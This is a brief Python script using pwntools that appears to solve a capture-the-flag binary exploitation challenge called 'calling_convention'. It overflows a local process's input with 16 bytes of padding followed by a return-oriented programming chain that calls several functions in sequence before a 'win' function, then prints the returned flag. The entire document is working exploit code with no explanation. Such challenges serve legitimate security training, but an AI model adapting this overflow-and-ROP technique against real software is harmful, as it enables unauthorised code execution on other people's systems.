#!/usr/bin/python

from pwn import *

context.log_level = 'debug'
binary = context.binary = ELF('calling_convention')
p = process(binary.path)
r = ROP(binary)

r.number3()
r.set_key1()
r.ahhhhhhhh()
r.number3()
r.food()
r.win()

p.sendafter(b' > ', b'A'*16 + r.chain() + b'\n')
print(p.recvuntil(b'}').decode())

